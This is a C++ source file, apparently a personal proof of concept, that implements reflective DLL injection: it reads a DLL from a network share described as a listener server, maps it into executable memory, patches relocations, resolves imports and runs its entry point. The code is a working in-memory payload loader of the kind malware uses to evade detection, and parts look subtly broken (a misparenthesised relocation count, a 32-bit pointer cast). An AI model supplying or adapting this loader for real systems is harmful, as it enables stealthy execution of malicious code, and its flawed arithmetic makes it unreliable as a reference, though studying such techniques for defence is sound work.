/*
	Author:		1emvr
	Email:		1emvr@protonmail.com
	GitHub:		https://github.com/1emvr
	Date:		1.22.2023		17:52 PM

	Description:

			Reflective Dll injection PoC. Credit goes to ired.team:
			https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection

			As usual, this is mainly for my own analysis. "Imitation is the highest form of flattery".
			If you notice any errors in my analysis or can make any clarifications that I might have missed,
			please feel free to contact me. I prefer to know when I'm insane rather than living in blissful ignroance.

			Protypes/Structs/Other insanity referenced here: https://learn.microsoft.com/en-us/windows/win32/api/
*/
#include <Windows.h>
#include <iostream>
#include "pch.h"

	/*		Typedef structs that refer to offsets and address space within a PE header. This is for our convenience.	*/

typedef struct BASE_RELOCATION_BLOCK_T {
	DWORD PageAddress;
	DWORD BlockSize;
	/*
	 ^		
			These are defined here: https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#base-relocation-block
	 		The Base Relocation table starts with the base + RVA. This part of the PE format is where relocation
	 		rules are defined. These values are a set of prefered base addresses, but can be changed by the loader.
	*/

} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;
	/*

	*/
typedef struct BASE_RELOCATION_ENTRY_T {
	USHORT Offset : 12;
	USHORT Type : 4;
	/*
	 ^		
			The block-size is then followed by any number of Type or Offset field entries.
	 		When relocating, if necessary, the calculation is made between the base address
	 		in the relocation table - the actual position of the data irl. 
	*/

} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

using DLL_ENTRY = BOOL(WINAPI *)(HINSTANCE dll, DWORD reason, LPVOID reserved);

	/*		Defining namespace of DLL_ENTRY as a WinAPI pointer^	*/

int main(void) {

	using namespace std;

	PVOID imageBase = GetModuleHandleA(NULL);
	HANDLE pDll = CreateFileA(

		"\\\\archlinux\\home\\lemur\\__scripts\\dll\\reflective.dll", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL
	);

	DWORD64 dllSize = GetFileSize(pDll, NULL);
	LPVOID dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);
	DWORD outSize = 0;
	/*
	 ^		
			Reading remote Dll file from a listener-server and loading the contents
	 		into the heap when ready for injection. This memory is unmanaged.	
	*/

	ReadFile(pDll, dllBytes, dllSize, &outSize, NULL);
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders->e_lfanew);
	SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;
	/*		
	 ^		
			Read in the DOS and NT Headers in order to find the total size for new headers.
			(In preparation for a method known as "Process Hollowing")		
	
	*/																				

	LPVOID dllBase = VirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
	memcpy(dllBase, dllBytes, ntHeaders->OptionalHeader.SizeOfHeaders);
	/*
	 ^		
			Allocate virtual memory from the image base element of our NT header.
			We subtract the image-base from the dllBase to find the /\ Delta (difference).
	 
			Copy the data from dllBytes, using the size of all headers
			defined here: https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32

			The upcoming maths is a bit complicated. I don't fully understand Windows Internals yet...
			
	*/	

	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);

	for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {

		LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section->VirtualAddress);
		LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section->PointerToRawData);
		/*
		 ^	
			At this point, we find the first section of the NT Header. We need to find a destination
			address that is offset from the base to the end of 'DllBase'. We can then copy the raw-data
			pointer of the NT Headers, incrementing each section until we're done...

		*/
		memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
		section++;
	}
	IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dllBase;
	/*		
	 ^		
			Some pretty complex 'Image data' structure that defines all sorts of data pertaining to things such as the
			Architecture, The component-object-model (COM) descriptor table and a ton of other directories that I'm not familiar with. 
			
			We select the IMAGE_DIRECTORY_ENTRTY_BASERELOC table directory from this directory. We can then look for and offset
			from the table data plus the size of our Dll base address. We also initialize a counter for # of relocations processed.

	*/

	DWORD relocationsProcessed = 0;
	while (relocationsProcessed < relocations.Size) {
		/*
		 ^	
			We're going through the whole table, baby! Here goes nothing...

		*/

		PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
		relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
		DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK) / sizeof(BASE_RELOCATION_ENTRY));
		PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);
		/*
		 ^	
			Starting out, we point to our struct for BASE_RELOCATION_BLOCK. This will be the pointer of NT Headers BASERELOC table
			that has our "Data Directory" information. This gets incremented each time we read a member of this relocation block.

			Then we will count (Good job, genius). We can take this pointer for RELOCATION_BLOCK by BlockSize that was defined in the
			struct at the beginning of the script, subtract the Struct's BLOCK Size(PageAddress, BlockSize) // Struct ENTRY Size(Offset, Type).
			This will count the number of "entities" in our block with the magic of math.

			Ultimately, once we've calculated these.. "things", we can now add them and we have 
			a sort of "list" of everything that needs to be accounted for. I'm starting to sweat... 

		*/

		for (DWORD i = 0; i < relocationsCount; i++) {
		/*
		 ^
			We can begin iterating through each of these entities. Start by going through each entry from "the block".		
		*/
			relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);
			if (relocationEntries[i].Type == 0)
				continue;

			DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
			DWORD_PTR addressToPatch = 0;
			/*
			 ^
				We want the relative virtual addressing. This is what we need in order to calculate against the block in order
				to determine weather or not it needs to be "shifted", as talked about at the beginning of this script.
			*/

			ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
			addressToPatch += deltaImageBase;
			memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
			/*
			 ^
				The program commits to gathering process information, pointing to the base address of our ticking t1me-b0mb, with a zeroed buffer.
				Next step is to alter the patch-address to the /\ Delta calculated earlier. We can now copy our payload to the new address patch.
			*/
		}
	}
	/*
	 ^
		We now have the Dll loaded in memory and all of the headers parsed/referenced.
	*/

	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD)dllBase);

	LPCSTR libraryName = "";
	HMODULE library = NULL;

	while (importDescriptor->Name != NULL) {

		libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)dllBase;
		library = LoadLibraryA(libraryName);

		if (library) {

			PIMAGE_THUNK_DATA thunk = NULL;
			thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor->FirstThunk);

			while (thunk->u1.AddressOfData != NULL) {
				if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {

					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
					thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
				}
				else {

					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk->u1.AddressOfData);
					DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name);
					thunk->u1.Function = functionAddress;

				} ++thunk;
			}
		} importDescriptor++;
	}

	DLL_ENTRY DllEntry = (DLL_ENTRY)((DWORD_PTR)dllBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
	(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);

	CloseHandle(pDll);
	HeapFree(GetProcessHeap(), 0, dllBytes);

	return 0;
}